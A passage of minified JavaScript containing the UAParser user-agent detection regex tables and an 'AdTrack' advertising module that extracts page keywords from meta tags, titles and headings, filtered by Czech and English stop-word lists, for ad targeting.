        browser: [[/(opera\smini)\/([\w\.-]+)/i, /(opera\s[mobiletab]+).+version\/([\w\.-]+)/i, /(opera).+version\/([\w\.]+)/i, /(opera)[\/\s]+([\w\.]+)/i], [o, h], [/(opios)[\/\s]+([\w\.]+)/i], [[o, "Opera Mini"], h], [/\s(opr)\/([\w\.]+)/i], [[o, "Opera"], h], [/(kindle)\/([\w\.]+)/i, /(lunascape|maxthon|netfront|jasmine|blazer)[\/\s]?([\w\.]*)/i, /(avant\s|iemobile|slim|baidu)(?:browser)?[\/\s]?([\w\.]*)/i, /(?:ms|\()(ie)\s([\w\.]+)/i, /(rekonq)\/([\w\.]*)/i, /(chromium|flock|rockmelt|midori|epiphany|silk|skyfire|ovibrowser|bolt|iron|vivaldi|iridium|phantomjs|bowser|quark|qupzilla|falkon)\/([\w\.-]+)/i], [o, h], [/(konqueror)\/([\w\.]+)/i], [[o, "Konqueror"], h], [/(trident).+rv[:\s]([\w\.]+).+like\sgecko/i], [[o, "IE"], h], [/(edge|edgios|edga|edg)\/((\d+)?[\w\.]+)/i], [[o, "Edge"], h], [/(yabrowser)\/([\w\.]+)/i], [[o, "Yandex"], h], [/(puffin)\/([\w\.]+)/i], [[o, "Puffin"], h], [/(focus)\/([\w\.]+)/i], [[o, "Firefox Focus"], h], [/(opt)\/([\w\.]+)/i], [[o, "Opera Touch"], h], [/((?:[\s\/])uc?\s?browser|(?:juc.+)ucweb)[\/\s]?([\w\.]+)/i], [[o, "UCBrowser"], h], [/(comodo_dragon)\/([\w\.]+)/i], [[o, /_/g, " "], h], [/(windowswechat qbcore)\/([\w\.]+)/i], [[o, "WeChat(Win) Desktop"], h], [/(micromessenger)\/([\w\.]+)/i], [[o, "WeChat"], h], [/(brave)\/([\w\.]+)/i], [[o, "Brave"], h], [/(qqbrowserlite)\/([\w\.]+)/i], [o, h], [/(QQ)\/([\d\.]+)/i], [o, h], [/m?(qqbrowser)[\/\s]?([\w\.]+)/i], [o, h], [/(BIDUBrowser)[\/\s]?([\w\.]+)/i], [o, h], [/(2345Explorer)[\/\s]?([\w\.]+)/i], [o, h], [/(MetaSr)[\/\s]?([\w\.]+)/i], [o], [/(LBBROWSER)/i], [o], [/xiaomi\/miuibrowser\/([\w\.]+)/i], [h, [o, "MIUI Browser"]], [/;fbav\/([\w\.]+);/i], [h, [o, "Facebook"]], [/safari\s(line)\/([\w\.]+)/i, /android.+(line)\/([\w\.]+)\/iab/i], [o, h], [/headlesschrome(?:\/([\w\.]+)|\s)/i], [h, [o, "Chrome Headless"]], [/\swv\).+(chrome)\/([\w\.]+)/i], [[o, /(.+)/, "$1 WebView"], h], [/((?:oculus|samsung)browser)\/([\w\.]+)/i], [[o, /(.+(?:g|us))(.+)/, "$1 $2"], h], [/android.+version\/([\w\.]+)\s+(?:mobile\s?safari|safari)*/i], [h, [o, "Android Browser"]], [/(sailfishbrowser)\/([\w\.]+)/i], [[o, "Sailfish Browser"], h], [/(chrome|omniweb|arora|[tizenoka]{5}\s?browser)\/v?([\w\.]+)/i], [o, h], [/(dolfin)\/([\w\.]+)/i], [[o, "Dolphin"], h], [/((?:android.+)crmo|crios)\/([\w\.]+)/i], [[o, "Chrome"], h], [/(coast)\/([\w\.]+)/i], [[o, "Opera Coast"], h], [/fxios\/([\w\.-]+)/i], [h, [o, "Firefox"]], [/version\/([\w\.]+).+?mobile\/\w+\s(safari)/i], [h, [o, "Mobile Safari"]], [/version\/([\w\.]+).+?(mobile\s?safari|safari)/i], [h, o], [/webkit.+?(gsa)\/([\w\.]+).+?(mobile\s?safari|safari)(\/[\w\.]+)/i], [[o, "GSA"], h], [/webkit.+?(mobile\s?safari|safari)(\/[\w\.]+)/i], [o, [h, f.str, g.browser.oldsafari.version]], [/(webkit|khtml)\/([\w\.]+)/i], [o, h], [/(navigator|netscape)\/([\w\.-]+)/i], [[o, "Netscape"], h], [/(swiftfox)/i, /(icedragon|iceweasel|camino|chimera|fennec|maemo\sbrowser|minimo|conkeror)[\/\s]?([\w\.\+]+)/i, /(firefox|seamonkey|k-meleon|icecat|iceape|firebird|phoenix|palemoon|basilisk|waterfox)\/([\w\.-]+)$/i, /(mozilla)\/([\w\.]+).+rv\:.+gecko\/\d+/i, /(polaris|lynx|dillo|icab|doris|amaya|w3m|netsurf|sleipnir)[\/\s]?([\w\.]+)/i, /(links)\s\(([\w\.]+)/i, /(gobrowser)\/?([\w\.]*)/i, /(ice\s?browser)\/v?([\w\._]+)/i, /(mosaic)[\/\s]([\w\.]+)/i], [o, h]],
        cpu: [[/(?:(amd|x(?:(?:86|64)[_-])?|wow|win)64)[;\)]/i], [["architecture", "amd64"]], [/(ia32(?=;))/i], [["architecture", p.lowerize]], [/((?:i[346]|x)86)[;\)]/i], [["architecture", "ia32"]], [/windows\s(ce|mobile);\sppc;/i], [["architecture", "arm"]], [/((?:ppc|powerpc)(?:64)?)(?:\smac|;|\))/i], [["architecture", /ower/, "", p.lowerize]], [/(sun4\w)[;\)]/i], [["architecture", "sparc"]], [/((?:avr32|ia64(?=;))|68k(?=\))|arm(?:64|(?=v\d+[;l]))|(?=atmel\s)avr|(?:irix|mips|sparc)(?:64)?(?=;)|pa-risc)/i], [["architecture", p.lowerize]]],
        device: [[/\((ipad|playbook);[\w\s\),;-]+(rim|apple)/i], [a, c, [d, u]], [/applecoremedia\/[\w\.]+ \((ipad)/], [a, [c, "Apple"], [d, u]], [/(apple\s{0,1}tv)/i], [[a, "Apple TV"], [c, "Apple"]], [/(archos)\s(gamepad2?)/i, /(hp).+(touchpad)/i, /(hp).+(tablet)/i, /(kindle)\/([\w\.]+)/i, /\s(nook)[\w\s]+build\/(\w+)/i, /(dell)\s(strea[kpr\s\d]*[\dko])/i], [c, a, [d, u]], [/(kf[A-z]+)\sbuild\/.+silk\//i], [a, [c, "Amazon"], [d, u]], [/(sd|kf)[0349hijorstuw]+\sbuild\/.+silk\//i], [[a, f.str, g.device.amazon.model], [c, "Amazon"], [d, l]], [/android.+aft([bms])\sbuild/i], [a, [c, "Amazon"], [d, "smarttv"]], [/\((ip[honed|\s\w*]+);.+(apple)/i], [a, c, [d, l]], [/\((ip[honed|\s\w*]+);/i], [a, [c, "Apple"], [d, l]], [/(blackberry)[\s-]?(\w+)/i, /(blackberry|benq|palm(?=\-)|sonyericsson|acer|asus|dell|meizu|motorola|polytron)[\s_-]?([\w-]*)/i, /(hp)\s([\w\s]+\w)/i, /(asus)-?(\w+)/i], [c, a, [d, l]], [/\(bb10;\s(\w+)/i], [a, [c, "BlackBerry"], [d, l]], [/android.+(transfo[prime\s]{4,10}\s\w+|eeepc|slider\s\w+|nexus 7|padfone|p00c)/i], [a, [c, "Asus"], [d, u]], [/(sony)\s(tablet\s[ps])\sbuild\//i, /(sony)?(?:sgp.+)\sbuild\//i], [[c, "Sony"], [a, "Xperia Tablet"], [d, u]], [/android.+\s([c-g]\d{4}|so[-l]\w+)(?=\sbuild\/|\).+chrome\/(?![1-6]{0,1}\d\.))/i], [a, [c, "Sony"], [d, l]], [/\s(ouya)\s/i, /(nintendo)\s([wids3u]+)/i], [c, a, [d, "console"]], [/android.+;\s(shield)\sbuild/i], [a, [c, "Nvidia"], [d, "console"]], [/(playstation\s[34portablevi]+)/i], [a, [c, "Sony"], [d, "console"]], [/(sprint\s(\w+))/i], [[c, f.str, g.device.sprint.vendor], [a, f.str, g.device.sprint.model], [d, l]], [/(htc)[;_\s-]+([\w\s]+(?=\)|\sbuild)|\w+)/i, /(zte)-(\w*)/i, /(alcatel|geeksphone|nexian|panasonic|(?=;\s)sony)[_\s-]?([\w-]*)/i], [c, [a, /_/g, " "], [d, l]], [/(nexus\s9)/i], [a, [c, "HTC"], [d, u]], [/d\/huawei([\w\s-]+)[;\)]/i, /(nexus\s6p)/i], [a, [c, "Huawei"], [d, l]], [/(microsoft);\s(lumia[\s\w]+)/i], [c, a, [d, l]], [/[\s\(;](xbox(?:\sone)?)[\s\);]/i], [a, [c, "Microsoft"], [d, "console"]], [/(kin\.[onetw]{3})/i], [[a, /\./g, " "], [c, "Microsoft"], [d, l]], [/\s(milestone|droid(?:[2-4x]|\s(?:bionic|x2|pro|razr))?:?(\s4g)?)[\w\s]+build\//i, /mot[\s-]?(\w*)/i, /(XT\d{3,4}) build\//i, /(nexus\s6)/i], [a, [c, "Motorola"], [d, l]], [/android.+\s(mz60\d|xoom[\s2]{0,2})\sbuild\//i], [a, [c, "Motorola"], [d, u]], [/hbbtv\/\d+\.\d+\.\d+\s+\([\w\s]*;\s*(\w[^;]*);([^;]*)/i], [[c, p.trim], [a, p.trim], [d, "smarttv"]], [/hbbtv.+maple;(\d+)/i], [[a, /^/, "SmartTV"], [c, "Samsung"], [d, "smarttv"]], [/\(dtv[\);].+(aquos)/i], [a, [c, "Sharp"], [d, "smarttv"]], [/android.+((sch-i[89]0\d|shw-m380s|gt-p\d{4}|gt-n\d+|sgh-t8[56]9|nexus 10))/i, /((SM-T\w+))/i], [[c, "Samsung"], a, [d, u]], [/smart-tv.+(samsung)/i], [c, [d, "smarttv"], a], [/((s[cgp]h-\w+|gt-\w+|galaxy\snexus|sm-\w[\w\d]+))/i, /(sam[sung]*)[\s-]*(\w+-?[\w-]*)/i, /sec-((sgh\w+))/i], [[c, "Samsung"], a, [d, l]], [/sie-(\w*)/i], [a, [c, "Siemens"], [d, l]], [/(maemo|nokia).*(n900|lumia\s\d+)/i, /(nokia)[\s_-]?([\w-]*)/i], [[c, "Nokia"], a, [d, l]], [/android[x\d\.\s;]+\s([ab][1-7]\-?[0178a]\d\d?)/i], [a, [c, "Acer"], [d, u]], [/android.+([vl]k\-?\d{3})\s+build/i], [a, [c, "LG"], [d, u]], [/android\s3\.[\s\w;-]{10}(lg?)-([06cv9]{3,4})/i], [[c, "LG"], a, [d, u]], [/(lg) netcast\.tv/i], [c, a, [d, "smarttv"]], [/(nexus\s[45])/i, /lg[e;\s\/-]+(\w*)/i, /android.+lg(\-?[\d\w]+)\s+build/i], [a, [c, "LG"], [d, l]], [/(lenovo)\s?(s(?:5000|6000)(?:[\w-]+)|tab(?:[\s\w]+))/i], [c, a, [d, u]], [/android.+(ideatab[a-z0-9\-\s]+)/i], [a, [c, "Lenovo"], [d, u]], [/(lenovo)[_\s-]?([\w-]+)/i], [c, a, [d, l]], [/linux;.+((jolla));/i], [c, a, [d, l]], [/((pebble))app\/[\d\.]+\s/i], [c, a, [d, "wearable"]], [/android.+;\s(oppo)\s?([\w\s]+)\sbuild/i], [c, a, [d, l]], [/crkey/i], [[a, "Chromecast"], [c, "Google"]], [/android.+;\s(glass)\s\d/i], [a, [c, "Google"], [d, "wearable"]], [/android.+;\s(pixel c)[\s)]/i], [a, [c, "Google"], [d, u]], [/android.+;\s(pixel( [23])?( xl)?)[\s)]/i], [a, [c, "Google"], [d, l]], [/android.+;\s(\w+)\s+build\/hm\1/i, /android.+(hm[\s\-_]*note?[\s_]*(?:\d\w)?)\s+build/i, /android.+(mi[\s\-_]*(?:a\d|one|one[\s_]plus|note lte)?[\s_]*(?:\d?\w?)[\s_]*(?:plus)?)\s+build/i, /android.+(redmi[\s\-_]*(?:note)?(?:[\s_]*[\w\s]+))\s+build/i], [[a, /_/g, " "], [c, "Xiaomi"], [d, l]], [/android.+(mi[\s\-_]*(?:pad)(?:[\s_]*[\w\s]+))\s+build/i], [[a, /_/g, " "], [c, "Xiaomi"], [d, u]], [/android.+;\s(m[1-5]\snote)\sbuild/i], [a, [c, "Meizu"], [d, l]], [/(mz)-([\w-]{2,})/i], [[c, "Meizu"], a, [d, l]], [/android.+a000(1)\s+build/i, /android.+oneplus\s(a\d{4})\s+build/i], [a, [c, "OnePlus"], [d, l]], [/android.+[;\/]\s*(RCT[\d\w]+)\s+build/i], [a, [c, "RCA"], [d, u]], [/android.+[;\/\s]+(Venue[\d\s]{2,7})\s+build/i], [a, [c, "Dell"], [d, u]], [/android.+[;\/]\s*(Q[T|M][\d\w]+)\s+build/i], [a, [c, "Verizon"], [d, u]], [/android.+[;\/]\s+(Barnes[&\s]+Noble\s+|BN[RT])(V?.*)\s+build/i], [[c, "Barnes & Noble"], a, [d, u]], [/android.+[;\/]\s+(TM\d{3}.*\b)\s+build/i], [a, [c, "NuVision"], [d, u]], [/android.+;\s(k88)\sbuild/i], [a, [c, "ZTE"], [d, u]], [/android.+[;\/]\s*(gen\d{3})\s+build.*49h/i], [a, [c, "Swiss"], [d, l]], [/android.+[;\/]\s*(zur\d{3})\s+build/i], [a, [c, "Swiss"], [d, u]], [/android.+[;\/]\s*((Zeki)?TB.*\b)\s+build/i], [a, [c, "Zeki"], [d, u]], [/(android).+[;\/]\s+([YR]\d{2})\s+build/i, /android.+[;\/]\s+(Dragon[\-\s]+Touch\s+|DT)(\w{5})\sbuild/i], [[c, "Dragon Touch"], a, [d, u]], [/android.+[;\/]\s*(NS-?\w{0,9})\sbuild/i], [a, [c, "Insignia"], [d, u]], [/android.+[;\/]\s*((NX|Next)-?\w{0,9})\s+build/i], [a, [c, "NextBook"], [d, u]], [/android.+[;\/]\s*(Xtreme\_)?(V(1[045]|2[015]|30|40|60|7[05]|90))\s+build/i], [[c, "Voice"], a, [d, l]], [/android.+[;\/]\s*(LVTEL\-)?(V1[12])\s+build/i], [[c, "LvTel"], a, [d, l]], [/android.+;\s(PH-1)\s/i], [a, [c, "Essential"], [d, l]], [/android.+[;\/]\s*(V(100MD|700NA|7011|917G).*\b)\s+build/i], [a, [c, "Envizen"], [d, u]], [/android.+[;\/]\s*(Le[\s\-]+Pan)[\s\-]+(\w{1,9})\s+build/i], [c, a, [d, u]], [/android.+[;\/]\s*(Trio[\s\-]*.*)\s+build/i], [a, [c, "MachSpeed"], [d, u]], [/android.+[;\/]\s*(Trinity)[\-\s]*(T\d{3})\s+build/i], [c, a, [d, u]], [/android.+[;\/]\s*TU_(1491)\s+build/i], [a, [c, "Rotor"], [d, u]], [/android.+(KS(.+))\s+build/i], [a, [c, "Amazon"], [d, u]], [/android.+(Gigaset)[\s\-]+(Q\w{1,9})\s+build/i], [c, a, [d, u]], [/\s(tablet|tab)[;\/]/i, /\s(mobile)(?:[;\/]|\ssafari)/i], [[d, p.lowerize], c, a], [/[\s\/\(](smart-?tv)[;\)]/i], [[d, "smarttv"]], [/(android[\w\.\s\-]{0,9});.+build/i], [a, [c, "Generic"]]],
        engine: [[/windows.+\sedge\/([\w\.]+)/i], [h, [o, "EdgeHTML"]], [/webkit\/537\.36.+chrome\/(?!27)/i], [[o, "Blink"]], [/(presto)\/([\w\.]+)/i, /(webkit|trident|netfront|netsurf|amaya|lynx|w3m|goanna)\/([\w\.]+)/i, /(khtml|tasman|links)[\/\s]\(?([\w\.]+)/i, /(icab)[\/\s]([23]\.[\d\.]+)/i], [o, h], [/rv\:([\w\.]{1,9}).+(gecko)/i], [h, o]],
        os: [[/microsoft\s(windows)\s(vista|xp)/i], [o, h], [/(windows)\snt\s6\.2;\s(arm)/i, /(windows\sphone(?:\sos)*)[\s\/]?([\d\.\s\w]*)/i, /(windows\smobile|windows)[\s\/]?([ntce\d\.\s]+\w)/i], [o, [h, f.str, g.os.windows.version]], [/(win(?=3|9|n)|win\s9x\s)([nt\d\.]+)/i], [[o, "Windows"], [h, f.str, g.os.windows.version]], [/\((bb)(10);/i], [[o, "BlackBerry"], h], [/(blackberry)\w*\/?([\w\.]*)/i, /(tizen)[\/\s]([\w\.]+)/i, /(android|webos|palm\sos|qnx|bada|rim\stablet\sos|meego|sailfish|contiki)[\/\s-]?([\w\.]*)/i], [o, h], [/(symbian\s?os|symbos|s60(?=;))[\/\s-]?([\w\.]*)/i], [[o, "Symbian"], h], [/\((series40);/i], [o], [/mozilla.+\(mobile;.+gecko.+firefox/i], [[o, "Firefox OS"], h], [/(nintendo|playstation)\s([wids34portablevu]+)/i, /(mint)[\/\s\(]?(\w*)/i, /(mageia|vectorlinux)[;\s]/i, /(joli|[kxln]?ubuntu|debian|suse|opensuse|gentoo|(?=\s)arch|slackware|fedora|mandriva|centos|pclinuxos|redhat|zenwalk|linpus)[\/\s-]?(?!chrom)([\w\.-]*)/i, /(hurd|linux)\s?([\w\.]*)/i, /(gnu)\s?([\w\.]*)/i], [o, h], [/(cros)\s[\w]+\s([\w\.]+\w)/i], [[o, "Chromium OS"], h], [/(sunos)\s?([\w\.\d]*)/i], [[o, "Solaris"], h], [/\s([frentopc-]{0,4}bsd|dragonfly)\s?([\w\.]*)/i], [o, h], [/(haiku)\s(\w+)/i], [o, h], [/cfnetwork\/.+darwin/i, /ip[honead]{2,4}(?:.*os\s([\w]+)\slike\smac|;\sopera)/i], [[h, /_/g, "."], [o, "iOS"]], [/(mac\sos\sx)\s?([\w\s\.]*)/i, /(macintosh|mac(?=_powerpc)\s)/i], [[o, "Mac OS"], [h, /_/g, "."]], [/((?:open)?solaris)[\/\s-]?([\w\.]*)/i, /(aix)\s((\d)(?=\.|\)|\s)[\w\.])*/i, /(plan\s9|minix|beos|os\/2|amigaos|morphos|risc\sos|openvms|fuchsia)/i, /(unix)\s?([\w\.]*)/i], [o, h]]
      },
      k = function (t, e) {
        if ("object" == typeof t && (e = t, t = void 0), !(this instanceof k)) return new k(t, e).getResult();
        var i = t || (n && n.navigator && n.navigator.userAgent ? n.navigator.userAgent : ""),
          r = e ? p.extend(m, e) : m;
        return this.getBrowser = function () {
          var t = {
            name: void 0,
            version: void 0
          };
          return f.rgx.call(t, i, r.browser), t.major = p.major(t.version), t;
        }, this.getCPU = function () {
          var t = {
            architecture: void 0
          };
          return f.rgx.call(t, i, r.cpu), t;
        }, this.getDevice = function () {
          var t = {
            vendor: void 0,
            model: void 0,
            type: void 0
          };
          return f.rgx.call(t, i, r.device), t;
        }, this.getEngine = function () {
          var t = {
            name: void 0,
            version: void 0
          };
          return f.rgx.call(t, i, r.engine), t;
        }, this.getOS = function () {
          var t = {
            name: void 0,
            version: void 0
          };
          return f.rgx.call(t, i, r.os), t;
        }, this.getResult = function () {
          return {
            ua: this.getUA(),
            browser: this.getBrowser(),
            engine: this.getEngine(),
            os: this.getOS(),
            device: this.getDevice(),
            cpu: this.getCPU()
          };
        }, this.getUA = function () {
          return i;
        }, this.setUA = function (t) {
          return i = t, this;
        }, this;
      };
    k.VERSION = "0.7.20", k.BROWSER = {
      NAME: o,
      MAJOR: "major",
      VERSION: h
    }, k.CPU = {
      ARCHITECTURE: "architecture"
    }, k.DEVICE = {
      MODEL: a,
      VENDOR: c,
      TYPE: d,
      CONSOLE: "console",
      MOBILE: l,
      SMARTTV: "smarttv",
      TABLET: u,
      WEARABLE: "wearable",
      EMBEDDED: "embedded"
    }, k.ENGINE = {
      NAME: o,
      VERSION: h
    }, k.OS = {
      NAME: o,
      VERSION: h
    }, void 0 !== e ? (void 0 !== t && t.exports && (e = t.exports = k), e.UAParser = k) : void 0 === (r = function () {
      return k;
    }.call(e, i, e, t)) || (t.exports = r);
    var b = n && (n.jQuery || n.Zepto);
    if (void 0 !== b && !b.ua) {
      var v = new k();
      b.ua = v.getResult(), b.ua.get = function () {
        return v.getUA();
      }, b.ua.set = function (t) {
        v.setUA(t);
        var e = v.getResult();
        for (var i in e) b.ua[i] = e[i];
      };
    }
  }("object" == typeof window ? window : this);
}, function (t, e) {
  AdTrack.Chain = function () {
    var t = {},
      e = null,
      i = this,
      r = {},
      n = function (e, i) {
        if (t[e]) {
          for (var n = [], s = 0; f = t[e][s]; s++) f !== i && n.push(f);
          t[e] = n;
        }
        return r;
      },
      s = function (a, o, d) {
        d || (d = 0);
        var c = null;
        return a[d] && (c = a[d]), "object" == typeof c && null !== c ? c[o](e, function (t) {
          e = t, s.call(i, a, o, ++d);
        }) : function (e, i) {
          if (t[e]) for (var r = 0; f = t[e][r]; r++) f(i), n(e, f);
        }("done", e), r;
      };
    return r = {
      run: s,
      on: function (e, i) {
        return t[e] || (t[e] = []), t[e].push(i), r;
      },
      off: n
    };
  }(), AdTrack.KeywordsModule = AdTrack.KeywordsModule || function (t) {
    this.originSend = {}, this.blackListedOrigins = ["online"], this.track = t, this.kwProcessor = [], this.kwFactory = null, this.reportingSwitch = !0;
  }, AdTrack.KeywordsModule.prototype = {
    report: function (t, e) {
      this.processor(t, e).getKeywords(function (t) {
        for (var e in t) if (t.hasOwnProperty(e)) {
          var i = t[e],
            r = i + e;
          if (-1 === this.blackListedOrigins.indexOf(i)) {
            if (this.originSend[r] && !0 === this.originSend[r]) {
              delete t[e];
              continue;
            }
            this.originSend[r] = !0;
          } else delete t[e];
        }
        t && Object.keys(t).length > 0 && this.reportingSwitch && this.track.evKeywords(t);
      }.bind(this));
    },
    handlerFactory: function () {
      return this.kwFactory || (this.kwFactory = new AdTrack.KeywordsModule.HandlerFactory(this.track)), this.kwFactory;
    },
    processor: function (t, e) {
      return this.kwProcessor[e] || (this.kwProcessor[e] = new AdTrack.KeywordsModule.Processor(t)), this.kwProcessor[e];
    }
  }, AdTrack.KeywordsModule.HandlerFactory = function (t) {
    this.track = t, this.handlers = [];
  }, AdTrack.KeywordsModule.HandlerFactory.prototype = {
    create: function (t) {
      if (!this.handlers[t]) if ("dmpm-tv" === t) this.handlers[t] = new AdTrack.KeywordsModule.DmpmTV(this.track);else if ("html-extract" === t) this.handlers[t] = new AdTrack.KeywordsModule.PageExtractor(this.track);else if ("ua-extract" === t) this.handlers[t] = new AdTrack.KeywordsModule.UserAgentExtractor();else {
        if ("hbbtv-ua-parser" !== t) return this.track.doError("Undefined keyword handler type " + t), null;
        this.handlers[t] = new AdTrack.KeywordsModule.HbbTvUaExtractor();
      }
      return this.handlers[t];
    }
  }, AdTrack.KeywordsModule.Processor = function (t) {
    this.channel = t, this.kw = null;
  }, AdTrack.KeywordsModule.Processor.prototype = {
    getKeywords: function (t) {
      var e = this,
        i = function (i) {
          e.kw = i, t(i);
        }.bind(this);
      if (null == this.kw) {
        var r = this.channel.kwHandlers || [];
        AdTrack.Chain.on("done", i).run(r, "getKeywords");
      } else t(this.kw);
    }
  };
}, function (t, e) {
  AdTrack.WordExtractor = function (t) {
    this.dom = t, this.keyword = [], this.minLength = 4, this.stopWordsCZ = ["a", "aby", "aj", "ale", "anebo", "ani", "aniž", "ano", "asi", "avšak", "až", "ba", "bez", "bude", "budem", "budeš", "by", "byl", "byla", "byli", "bylo", "být", "či", "článek", "článku", "články", "co", "čom", "což", "cz", "další", "dalších", "do", "dnes", "ho", "i", "jak", "jaké", "jako", "je", "jeho", "jej", "její", "jejich", "jen", "ještě", "jenž", "ji", "jiné", "již", "jsem", "jses", "jsi", "jsme", "jsou", "jste", "k", "kam", "kde", "kdo", "když", "ke", "která", "které", "kteří", "kterou", "který", "ku", "má", "máte", "mé", "mezi", "mi", "mít", "mne", "mně", "mnou", "můj", "může", "my", "na", "nad", "nám", "napište", "nás", "naší", "naši", "ne", "nebo", "neboť", "nechť", "nejsou", "není", "net", "než", "ní", "nic", "nové", "nový", "nýbrž", "o", "od", "ode", "on", "org", "pak", "po", "pod", "podle", "pokud", "pouze", "právě", "před", "přes", "při", "pro", "proč", "proto", "protože", "první", "ptá", "re", "s", "se", "si", "sice", "spol", "strana", "své", "svůj", "svých", "svým", "svými", "ta", "tak", "také", "takže", "tamhle", "tato", "tedy", "téma", "té", "ten", "tedy", "tento", "teto", "tim ", "timto", "tipy", "to", "tohle", "toho", "tohoto", "tom", "tomto", "tomuto", "totiz", "tu", "tudiz", "tuto", "tvuj", "ty", "tyto", "u", "už", "v", "vám", "vás", "vaše", "ve", "vedle", "více", "však", "všechen", "vy", "vždyť", "z", "za", "zda", "zde", "ze", "zpět", "zprávy"], this.stopWordsEN = ["a", "about", "above", "across", "after", "again", "against", "all", "almost", "alone", "along", "already", "also", "although", "always", "among", "an", "and", "another", "any", "anybody", "anyone", "anything", "anywhere", "are", "area", "areas", "around", "as", "ask", "asked", "asking", "asks", "at", "away", "b", "back", "backed", "backing", "backs", "be", "became", "because", "become", "becomes", "been", "before", "began", "behind", "being", "beings", "best", "better", "between", "big", "both", "but", "by", "c", "came", "can", "cannot", "case", "cases", "certain", "certainly", "clear", "clearly", "come", "could", "d", "did", "differ", "different", "differently", "do", "does", "done", "down", "down", "downed", "downing", "downs", "during", "e", "each", "early", "either", "end", "ended", "ending", "ends", "enough", "even", "evenly", "ever", "every", "everybody", "everyone", "everything", "everywhere", "f", "face", "faces", "fact", "facts", "far", "felt", "few", "find", "finds", "first", "for", "four", "from", "full", "fully", "further", "furthered", "furthering", "furthers", "g", "gave", "general", "generally", "get", "gets", "give", "given", "gives", "go", "going", "good", "goods", "got", "great", "greater", "greatest", "group", "grouped", "grouping", "groups", "h", "had", "has", "have", "having", "he", "her", "here", "herself", "high", "high", "high", "higher", "highest", "him", "himself", "his", "how", "however", "i", "if", "important", "in", "interest", "interested", "interesting", "interests", "into", "is", "it", "its", "itself", "j", "just", "k", "keep", "keeps", "kind", "knew", "know", "known", "knows", "l", "large", "largely", "last", "later", "latest", "least", "less", "let", "lets", "like", "likely", "long", "longer", "longest", "m", "made", "make", "making", "man", "many", "may", "me", "member", "members", "men", "might", "more", "most", "mostly", "mr", "mrs", "much", "must", "my", "myself", "n", "necessary", "need", "needed", "needing", "needs", "never", "new", "newer", "newest", "next", "no", "nobody", "non", "noone", "not", "nothing", "now", "nowhere", "number", "numbers", "o", "of", "off", "often", "old", "older", "oldest", "on", "once", "one", "only", "open", "opened", "opening", "opens", "or", "order", "ordered", "ordering", "orders", "other", "others", "our", "out", "over", "p", "part", "parted", "parting", "parts", "per", "perhaps", "place", "places", "point", "pointed", "pointing", "points", "possible", "present", "presented", "presenting", "presents", "problem", "problems", "put", "puts", "q", "quite", "r", "rather", "really", "right", "right", "room", "rooms", "s", "said", "same", "saw", "say", "says", "second", "seconds", "see", "seem", "seemed", "seeming", "seems", "sees", "several", "shall", "she", "should", "show", "showed", "showing", "shows", "side", "sides", "since", "small", "smaller", "smallest", "so", "some", "somebody", "someone", "something", "somewhere", "state", "states", "still", "still", "such", "sure", "t", "take", "taken", "than", "that", "the", "their", "them", "then", "there", "therefore", "these", "they", "thing", "things", "think", "thinks", "this", "those", "though", "thought", "thoughts", "three", "through", "thus", "to", "today", "together", "too", "took", "toward", "turn", "turned", "turning", "turns", "two", "u", "under", "until", "up", "upon", "us", "use", "used", "uses", "v", "very", "w", "want", "wanted", "wanting", "wants", "was", "way", "ways", "we", "well", "wells", "went", "were", "what", "when", "where", "whether", "which", "while", "who", "whole", "whose", "why", "will", "with", "within", "without", "work", "worked", "working", "works", "would", "x", "y", "year", "years", "yet", "you", "young", "younger", "youngest", "your", "yours", "z", "zero", "safeframe", "container"];
  }, AdTrack.WordExtractor.prototype = {
    log: function () {},
    getWords: function () {
      var t = [];
      return t = this.getMetadata().concat(t), t = this.getTitle().concat(t), t = this.getH1().concat(t), this.keyword = t, this.removeStopWords(), this.keyword;
    },
    getMetadata: function () {
      var t = null;
      if (this.dom && this.dom.querySelector('meta[name="keywords"]'), null == t) return [];
      t = t.getAttribute("content"), t = this.replaceChar(t), t = this.splitWords(t);
      for (var e = [], i = 0; i < t.length; i++) {
        var r = t[i].trim();
        "" != r && e.push(r);
      }
      return e;
    },
    getTitle: function () {
      var t = this.dom.title;
      return t = this.replaceChar(t), t = this.splitWords(t);
    },
    getH1: function () {
      for (var t = this.dom.getElementsByTagName("h1"), e = [], i = 0; i < t.length; i++) {
        var r = t[i].innerHTML;
        r = this.replaceChar(r), e = this.splitWords(r).concat(e);
      }
      return e;
    },
    replaceChar: function (t) {
      return t = (t = (t = (t = (t = t.replace(/<[a-zA-Z][^>]*>/g, " ")).replace(/<\/[a-zA-Z][^>]*>/g, " ")).replace(/\&[a-z]+;/g, " ")).replace(/  +/g, " ")).trim();
    },
    splitWords: function (t) {
      if (null == t) return [];
      for (var e = t.split(" "), i = [], r = new RegExp(/[a-záčďéěíňóřšťůúýž]+/g), n = 0; n < e.length; n++) if ("" != e[n]) {
        if (null == (t = e[n].toLowerCase().match(r)) || "undefined" == t) continue;
        i = i.concat(t);
      }
      return i;
    },
    generateURL: function () {
      if (this.getWords(), 0 == this.keyword.length) return "";
      for (var t = "&mkw=", e = 0; e < this.keyword.length; e++) 0 != e && (t += ","), t += encodeURI(this.keyword[e]);
      return t;
    },
    generateCSV: function () {
      if (this.getWords(), 0 == this.keyword.length) return "";
      for (var t = "", e = 0; e < this.keyword.length; e++) 0 != e && (t += ","), t += encodeURI(this.keyword[e]);
      return t;
    },
    removeStopWords: function () {
      for (var t, e = [], i = 0; i < this.keyword.length; i++) t = this.keyword[i].toLowerCase(), -1 == this.stopWordsCZ.indexOf(t) && -1 == this.stopWordsEN.indexOf(t) && -1 == e.indexOf(t) && t.length >= this.minLength && e.push(t);
      this.keyword = e;
    }
  };
}, function (t, e) {
  AdTrack.KeywordsModule.PageExtractor = function (t) {
    this.track = t, this.keywords = null, this.wordExtractor = new AdTrack.WordExtractor(t.document);
  }, AdTrack.KeywordsModule.PageExtractor.prototype = {
    getKeywords: function (t, e) {
      if (null == this.keywords || void 0 === this.keywords) {
        var i = this.extractKeywords(),
          r = 0,
          n = {};
        for (var s in i) if (i.hasOwnProperty(s)) {
          if ((r += i[s].length) > 1e3) break;
          n[i[s]] = "online";
        }
        this.keywords = n;
      }
      e(this.mergeKeywords(t, this.keywords));
    },
    extractKeywords: function () {
      return this.wordExtractor.getWords();
    },
    mergeKeywords: function (t, e) {
      var i = {};
      for (var r in t) t.hasOwnProperty(r) && (i[r] = t[r]);
      for (var r in e) e.hasOwnProperty(r) && (i[r] = e[r]);
      return i;
    }
  };
}, function (t, e) {
  AdTrack.KeywordsModule.UserAgentExtractor = function (t) {
    this.track = t, this.keywords = null;
  }, AdTrack.KeywordsModule.UserAgentExtractor.prototype = {
